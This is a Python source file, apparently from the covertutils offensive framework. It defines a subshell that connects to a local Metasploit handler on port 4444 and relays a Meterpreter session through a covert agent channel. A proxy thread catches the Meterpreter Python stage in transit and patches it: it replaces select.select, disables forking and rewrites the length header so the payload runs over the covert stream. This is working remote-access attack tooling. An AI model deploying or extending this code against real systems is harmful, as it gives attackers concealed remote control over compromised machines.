from covertutils.shells.subshells import SimpleSubShell

import socket
import threading
from time import sleep

import struct


def meterpreter_proxy( proxy_socket, instance ) :
	print ("Started Meterpreter Proxy thread")
	b = 42231
	# b = 4096
	# b = 2048
	while True :
		# print "recv'ing",
		resp = proxy_socket.recv(b)
		# print "recv()'d %d bytes of data'" % b
		# if resp :
			# print "[+] Received from Handler: " + resp.encode('hex')

		if "#!/usr/bin/python" in resp :
			print "[!]Injecting select.select bypass"
			resp2 = resp
			dummy_func = '''
import select
def dummy(*args, **kwargs) :
	if s.empty() : return [],[],[]
	return [s],[],[]
select.select = dummy
'''
			resp2 = resp.replace("import select", dummy_func)
			resp2 = resp2.replace("TRY_TO_FORK = True", "TRY_TO_FORK = False")
			resp2 = resp2.replace("#!/usr/bin/python", 'print "[!!!] METERPRETER passed control!"')
			resp2 = resp2.replace("DEBUGGING = False", "DEBUGGING = True")

			l = len(resp2)
			print "Final Length = %d" % l
			resp = struct.pack("<I", l) + resp2[4:]

		instance.handler.preferred_send( resp, instance.stream )
		# sleep(0.01)
		b = 16655


class MeterpreterSubShell ( SimpleSubShell ) :

# 	intro = """
# This is an Example Shell. It has a custom prompt, and reverses all input before sending to the stage.
# 	"""

	def __init__( self, stream, handler, queue_dict, base_shell, ignore_messages = set(), prompt_templ = "{stream} < ") :
		SimpleSubShell.__init__( self, stream, handler, queue_dict, base_shell, ignore_messages, prompt_templ )
		"""A method that uses the `prompt_templ` argument
		to reformat the prompt
		(in case the `format()` {tags} have changed)"""
		self.updatePrompt()

		def meterpreter_send(message, instance) :
			print ("[+] Received from Agent {")
			print "[!] '%s'" % message.encode('hex')
			instance.proxy.send(message)
			print "[+] Message Delivered to Handler! }"

		print ("Creating Proxy socket")
		self.proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.proxy.connect(("127.0.0.1",4444))
		print ("Connected to meterpreter handler socket!")

		self.message_function = meterpreter_send
		sleep(0.1)
		self.proxy_thread = threading.Thread( target = meterpreter_proxy, args = ( self.proxy, self ) )
		self.proxy_thread.daemon = True
		self.proxy_thread.start()



	def default( self, line ) :
		# command = line[::-1]	# Reversing the user input string
		# print( "Sending '%s' to the 'meterpreter' agent!" % line )
		# self.handler.preferred_send( line, self.stream )
		pass
